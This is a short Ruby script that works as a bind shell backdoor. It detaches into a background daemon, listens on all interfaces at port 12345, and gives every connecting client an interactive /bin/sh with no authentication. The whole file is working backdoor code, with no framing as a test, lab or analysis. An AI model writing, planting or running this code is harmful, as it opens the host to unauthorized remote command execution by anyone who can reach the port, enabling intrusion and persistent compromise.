require 'socket'

PORT = 12345

def daemonize
  pid = fork
  exit if pid
  Process.setsid
  pid = fork
  exit if pid
  File.umask(0)
  STDIN.reopen('/dev/null')
  STDOUT.reopen('/dev/null', 'a')
  STDERR.reopen('/dev/null', 'a')
end

def handle_connection(client)
  STDIN.reopen(client)
  STDOUT.reopen(client)
  STDERR.reopen(client)

  exec '/bin/sh'
end

def main
  daemonize

  server = TCPServer.new('0.0.0.0', PORT)

  loop do
    client = server.accept
    pid = fork do
      server.close
      handle_connection(client)
    end
    client.close
    Process.detach(pid)
  end
end

main
